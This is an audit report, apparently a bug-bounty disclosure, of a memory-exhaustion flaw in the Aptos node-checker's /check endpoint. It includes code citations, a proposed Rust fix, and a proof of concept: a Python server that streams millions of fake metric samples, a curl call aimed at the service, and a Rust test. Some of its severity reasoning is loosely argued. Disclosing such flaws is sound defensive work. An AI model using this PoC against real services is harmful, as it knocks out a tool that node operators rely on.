# Audit Report

## Title
Memory Exhaustion via Unbounded Prometheus Metrics Sample Iteration in Node-Checker API

## Summary
The node-checker service's `/check` API endpoint is vulnerable to memory exhaustion attacks through unbounded processing of Prometheus metrics samples. An attacker can provide a malicious metrics endpoint returning millions of samples, causing the service to consume excessive memory and crash.

## Finding Description

The vulnerability exists in the metrics processing pipeline where user-controlled URLs are queried for Prometheus metrics without enforcing response size or sample count limits.

**Attack Flow:**

1. Attacker calls the public `/check` endpoint with attacker-controlled `node_url` and `metrics_port` parameters [1](#0-0) 

2. The service creates a `NodeAddress` with the attacker's URL and builds an HTTP client with only a 4-second timeout [2](#0-1) 

3. When `MetricsProvider::get_scrape()` is invoked, it fetches the entire HTTP response body into memory without size validation [3](#0-2) 

4. The response is parsed using `Scrape::parse()` which creates a `Vec<Sample>` containing all samples from the response [4](#0-3) 

5. When `get_metric_value()` processes the metrics, it iterates through **all** samples in the vector without any bounds checking [5](#0-4) 

The attacker-controlled malicious server returns a Prometheus text format response with millions of metric samples. Since there are no limits on:
- HTTP response body size
- Number of samples in the parsed `Scrape` object
- Iteration count in `get_metric_value()`

The service exhausts available memory and crashes or becomes unresponsive.

**Invariant Violation:**
This breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits." The code performs unbounded memory allocation based on untrusted external input.

## Impact Explanation

**Severity: High** per bug bounty criteria for "API crashes"

The node-checker service provides a public HTTP API used by node operators to validate their node configurations. An attacker can:

1. **Crash the API service** by exhausting available memory
2. **Deny service to legitimate users** who rely on the health checker
3. **Affect node operators** during critical validation phases (e.g., AITs, validator onboarding)

While this doesn't directly impact consensus or funds, it falls under the **High Severity** category of "API crashes" which is explicitly listed in the bug bounty program criteria.

## Likelihood Explanation

**Likelihood: High**

- **Low Attack Complexity**: Attacker only needs to set up a simple HTTP server returning crafted Prometheus metrics
- **No Authentication Required**: The `/check` endpoint is publicly accessible without authentication
- **Trivial to Execute**: Single HTTP GET request to the node-checker with malicious parameters
- **No Special Privileges Needed**: Any internet user can exploit this

The attack requires minimal resources and technical skill, making it highly likely to be exploited.

## Recommendation

Implement multiple defense layers:

1. **Response Size Limit**: Add a maximum response body size check before parsing
2. **Sample Count Limit**: Limit the number of samples processed
3. **Early Termination**: Stop iterating once the required metric is found

**Proposed Fix:**

```rust
// In MetricsProvider::get_scrape()
const MAX_RESPONSE_SIZE: usize = 10 * 1024 * 1024; // 10MB limit

let body = response
    .text()
    .await
    .with_context(|| /*...*/)
    .map_err(|e| ProviderError::ParseError(anyhow!(e)))?;

if body.len() > MAX_RESPONSE_SIZE {
    return Err(ProviderError::ParseError(anyhow!(
        "Metrics response exceeds maximum size of {} bytes", 
        MAX_RESPONSE_SIZE
    )));
}

// In get_metric_value()
const MAX_SAMPLES_TO_SCAN: usize = 10_000;

for (idx, sample) in metrics.samples.iter().enumerate() {
    if idx >= MAX_SAMPLES_TO_SCAN {
        warn!("Exceeded maximum samples limit while searching for metric {}", metric_name);
        break;
    }
    // ... existing logic
}
```

Additionally, consider using streaming parsers that can abort early when size thresholds are exceeded.

## Proof of Concept

**Malicious Metrics Server (Python):**
```python
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler

class MaliciousMetricsHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/metrics':
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            
            # Generate millions of samples
            for i in range(5_000_000):
                metric = f'malicious_metric_{i} {{label="value"}} {i}\n'
                self.wfile.write(metric.encode())
        else:
            self.send_response(404)
            self.end_headers()

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 9101), MaliciousMetricsHandler)
    print("Malicious metrics server running on port 9101")
    server.serve_forever()
```

**Exploitation Steps:**
```bash
# 1. Start malicious server
python3 malicious_server.py &

# 2. Call node-checker API
curl "http://node-checker-service/check?baseline_configuration_id=devnet_fullnode&node_url=http://localhost&metrics_port=9101"

# 3. Monitor node-checker memory consumption
# Expected: Memory usage spikes dramatically as millions of samples are loaded and parsed
# Result: Service becomes unresponsive or crashes with OOM
```

**Rust Unit Test (for integration into codebase):**
```rust
#[tokio::test]
async fn test_large_metrics_response() {
    use std::sync::Arc;
    use wiremock::{MockServer, Mock, ResponseTemplate};
    use wiremock::matchers::{method, path};
    
    // Start mock server
    let mock_server = MockServer::start().await;
    
    // Generate huge metrics response
    let mut huge_response = String::new();
    for i in 0..1_000_000 {
        huge_response.push_str(&format!("test_metric_{} 1.0\n", i));
    }
    
    Mock::given(method("GET"))
        .and(path("/metrics"))
        .respond_with(ResponseTemplate::new(200).set_body_string(huge_response))
        .mount(&mock_server)
        .await;
    
    // Create MetricsProvider pointing to mock server
    let client = Arc::new(reqwest::Client::new());
    let provider = MetricsProvider::new(
        MetricsProviderConfig::default(),
        client,
        mock_server.uri().parse().unwrap(),
        80,
    );
    
    // This should not consume excessive memory
    // Without fix: will allocate ~50MB+ and iterate 1M times
    let result = provider.provide().await;
    
    // Test should timeout or measure memory usage
    assert!(result.is_ok());
}
```

**Notes**

This vulnerability specifically affects the node-checker service, which is an ecosystem monitoring tool rather than a core consensus or execution component. While it doesn't directly impact blockchain operations, the service is used by node operators for health validation, particularly during important events like Aptos Incentivized Testnet (AIT) participation and validator registration.

The root cause is the absence of defensive programming practices around external data ingestion - the code trusts that Prometheus metrics responses will be reasonably sized, which is a dangerous assumption when accepting arbitrary URLs from users.

The 4-second timeout on the HTTP request provides minimal protection, as an attacker can stream response data quickly enough to stay within the timeout while still delivering millions of samples. The actual memory exhaustion occurs during parsing and iteration, not during network transmission.

### Citations

**File:** ecosystem/node-checker/src/server/api.rs (L29-44)
```rust
    #[oai(path = "/check", method = "get")]
    async fn check(
        &self,
        /// The ID of the baseline node configuration to use for the evaluation, e.g. devnet_fullnode
        baseline_configuration_id: Query<String>,
        /// The URL of the node to check, e.g. http://44.238.19.217 or http://fullnode.mysite.com
        node_url: Query<Url>,
        /// If given, we will assume the metrics service is available at the given port.
        metrics_port: Query<Option<u16>>,
        /// If given, we will assume the API is available at the given port.
        api_port: Query<Option<u16>>,
        /// If given, we will assume that clients can communicate with your node via noise at the given port.
        noise_port: Query<Option<u16>>,
        /// A public key for the node, e.g. 0x44fd1324c66371b4788af0b901c9eb8088781acb29e6b8b9c791d5d9838fbe1f.
        /// This is only necessary for certain checkers, e.g. HandshakeChecker.
        public_key: Query<Option<String>>,
```

**File:** ecosystem/node-checker/src/runner/sync_runner.rs (L104-111)
```rust
        if let Ok(metrics_client) = target_node_address.get_metrics_client(Duration::from_secs(4)) {
            let metrics_client = Arc::new(metrics_client);
            provider_collection.target_metrics_provider = Some(MetricsProvider::new(
                self.provider_configs.metrics.clone(),
                metrics_client.clone(),
                target_node_address.url.clone(),
                target_node_address.get_metrics_port().unwrap(),
            ));
```

**File:** ecosystem/node-checker/src/provider/metrics.rs (L67-76)
```rust
        let body = response
            .text()
            .await
            .with_context(|| {
                format!(
                    "Failed to process response body from {} as text",
                    self.metrics_url
                )
            })
            .map_err(|e| ProviderError::ParseError(anyhow!(e)))?;
```

**File:** ecosystem/node-checker/src/provider/metrics.rs (L77-84)
```rust
        Scrape::parse(body.lines().map(|l| Ok(l.to_string())))
            .with_context(|| {
                format!(
                    "Failed to parse response text from {} as a Prometheus scrape",
                    self.metrics_url
                )
            })
            .map_err(|e| ProviderError::ParseError(anyhow!(e)))
```

**File:** ecosystem/node-checker/src/provider/metrics.rs (L116-134)
```rust
    for sample in &metrics.samples {
        if sample.metric == metric_name {
            match &expected_label {
                Some(expected_label) => {
                    let label_value = sample.labels.get(expected_label.key);
                    if let Some(label_value) = label_value {
                        if label_value == expected_label.value {
                            discovered_sample = Some(sample);
                            break;
                        }
                    }
                },
                None => {
                    discovered_sample = Some(sample);
                    break;
                },
            }
        }
    }
```
